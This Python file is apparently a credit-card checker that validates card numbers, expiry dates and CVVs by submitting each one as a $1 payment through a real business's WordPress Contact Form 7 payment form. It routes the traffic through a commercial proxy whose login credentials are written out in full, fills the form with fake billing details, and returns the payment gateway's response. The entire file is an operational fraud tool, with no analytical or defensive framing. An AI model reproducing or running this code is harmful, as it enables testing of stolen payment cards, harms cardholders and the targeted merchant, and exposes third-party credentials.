import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'www.choicetherapy1.com',
	    'accept': 'application/json, */*;q=0.1',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'origin': 'https://www.choicetherapy1.com',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	files = {
	    '_wpcf7': (None, '21949'),
	    '_wpcf7_version': (None, '5.9.3'),
	    '_wpcf7_locale': (None, 'en_US'),
	    '_wpcf7_unit_tag': (None, 'wpcf7-f21949-p7884-o1'),
	    '_wpcf7_container_post': (None, '7884'),
	    '_wpcf7_posted_data_hash': (None, '61a3669ea5448a752b55a8134a57fa46'),
	    'customer_first_name': (None, 'Rodam'),
	    'customer_last_name': (None, 'User'),
	    'patient_name': (None, ''),
	    'payment_amount': (None, '1'),
	    'email_address': (None, 'rodamuser08@gmail.com'),
	    'invoice_number': (None, ''),
	    'service_address': (None, 'No.236, 29th St'),
	    'service_city': (None, 'Pabedan'),
	    'service_state': (None, 'Yangon'),
	    'service_zipcode': (None, '11181'),
	    'authorize[cardholdername]': (None, 'Rodam User'),
	    'authorize[card_number]': (None, f'{n}'),
	    'authorize[exp_month]': (None, f'{mm}'),
	    'authorize[exp_year]': (None, f'20{yy}'),
	    'authorize[cvv_number]': (None, f'{cvc}'),
	}
	
	response = session.post(
	    'https://www.choicetherapy1.com/wp-json/contact-form-7/v1/contact-forms/21949/feedback',
	    headers=headers,
	    files=files,
	)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
		
	return (result)
